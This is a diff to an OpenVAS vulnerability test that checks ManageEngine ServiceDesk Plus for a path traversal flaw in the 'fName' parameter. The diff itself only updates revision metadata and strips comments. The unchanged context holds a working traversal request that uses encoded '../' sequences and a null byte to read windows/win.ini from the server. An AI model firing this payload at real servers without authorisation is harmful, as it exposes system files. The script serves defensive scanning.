@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manage_engine_servicedesk_plus_path_traversal_vuln_oct15.nasl 6183 2017-05-22 09:03:43Z teissa $
+# $Id: gb_manage_engine_servicedesk_plus_path_traversal_vuln_oct15.nasl 11227 2018-09-04 13:25:37Z mmartin $
 #
 # ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:manageengine:servicedesk_plus";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806510");
-  script_version("$Revision: 6183 $");
+  script_version("$Revision: 11227 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-22 11:03:43 +0200 (Mon, 22 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 15:25:37 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-10-21 13:10:53 +0530 (Wed, 21 Oct 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability");
@@ -76,24 +76,16 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-dir = "";
-appPort = "";
-
-## Get the port
 if(!appPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Application Location
 if(!dir = get_app_location(cpe:CPE, port:appPort)){
   exit(0);
 }
 
-##Construct Attack Request
 url = dir + 'workorder/FileDownload.jsp?module=support&fName=..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:appPort, url:url, check_header:TRUE,
    pattern:"; for 16-bit app support",
    extra_check:make_list("[extensions]", "SetupFileName", "DefaultAdmin")))
